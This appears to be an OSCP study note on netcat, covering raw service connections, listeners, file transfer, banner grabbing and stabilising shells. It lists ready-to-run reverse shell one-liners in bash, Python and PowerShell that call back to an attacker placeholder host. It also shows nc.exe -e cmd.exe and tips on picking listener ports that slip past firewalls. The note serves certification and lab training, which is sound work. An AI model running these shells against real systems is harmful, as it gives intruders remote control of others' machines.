# Netcat (nc) — Raw TCP Connections (OSCP)

Netcat is the **Swiss Army knife of networking**. It opens raw TCP/UDP connections — no protocol overhead.

Two main uses in OSCP:
1. **Connect to a service** to interact with it directly
2. **Listen for incoming shells** (reverse shells call back to you)

---

## Connect to a Service

```bash
nc <IP> <PORT>
```

Examples:
```bash
nc 10.10.10.5 80        # connect to web server
nc 10.10.10.5 21        # connect to FTP
nc 10.10.10.5 4444      # connect to a CTF/pwn challenge
```

Once connected, type commands and press Enter. The server responds raw.

---

## Listen for a Reverse Shell

Set up a listener on your Kali machine BEFORE triggering the exploit:

```bash
nc -lvnp <PORT>
```

| Flag | Meaning |
|------|---------|
| `-l` | Listen mode |
| `-v` | Verbose (shows connections) |
| `-n` | No DNS resolution (faster) |
| `-p` | Port to listen on |

Example — listen on port 443:
```bash
nc -lvnp 443
```

When the victim connects back, you'll see a shell appear.

Common listener ports to use: **443, 80, 4444, 9001**
Ports 443 and 80 blend in with normal traffic and are less likely to be blocked by firewalls.

---

## nc.exe on Windows Targets

Kali ships a Windows netcat binary — transfer it to the target and call back with it.

```
/usr/share/windows-resources/binaries/nc.exe
```
→ 59,392 bytes. Serve it with `python3 -m http.server`, pull with `certutil`.

On the target — connect back to your listener:
```cmd
nc.exe <KALI_IP> <PORT> -e cmd.exe
```
→ `-e` attaches cmd's stdin/stdout to the socket. Listener first, then fire.

---

## Send a File

From attacker (Kali) — send a file:
```bash
nc -lvnp 4444 < file_to_send.exe
```

On victim — receive the file:
```bash
nc <KALI_IP> 4444 > received_file.exe
```

---

## Banner Grabbing (Quick Service Check)

```bash
nc -v <IP> <PORT>
```

Useful for:
- Grabbing version banners from FTP, SMTP, SSH, etc.
- Quickly checking if a port is actually serving something

---

## Send Raw HTTP Request

```bash
echo -e "GET / HTTP/1.0\r\n\r\n" | nc <IP> 80
```

---

## Common Reverse Shell One-Liners (Run on Victim)

These go ON THE TARGET to call back to your Kali listener.

**Bash:**
```bash
bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1
```

**Python:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**PowerShell (Windows):**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<KALI_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Stabilize a Netcat Shell (Linux)

Raw nc shells are fragile — Ctrl+C kills them. Stabilize immediately after getting a shell:

```bash
# On victim shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then press Ctrl+Z to background the shell, then on your Kali:
stty raw -echo; fg

# Then in the shell:
export TERM=xterm
```

---

## Related Notes

- [[Msfvenom]]
- [[File_Transfer]]
- [[Attack-Workflow]]
